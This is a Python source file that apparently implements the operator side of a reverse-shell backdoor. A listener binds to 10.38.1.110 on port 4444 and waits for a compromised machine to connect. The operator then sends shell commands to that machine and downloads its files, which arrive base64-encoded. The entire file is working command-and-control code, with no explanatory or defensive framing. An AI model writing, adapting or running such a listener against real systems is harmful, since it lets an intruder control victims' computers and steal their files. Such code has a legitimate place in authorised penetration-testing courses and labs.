import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections.')
        self.connection, address = listener.accept()
        print('[+] Got a connection from ' + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self, command):
        self.reliable_send(command)
        
        if command[0] == 'exit':
            self.connection.close()
            exit()
        
        return self.reliable_recieve()
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content.encode()))
            return '[+] Download Successful.'
    
    def run(self):
        while True:
            command = input('>> ')
            command = command.split(" ")
            result = self.execute_remotely(command)
            
            if command[0] == 'download':
                result = self.write_file(command[1], result)
            
            print(result)
            
my_listener = Listener('10.38.1.110', 4444)
my_listener.run()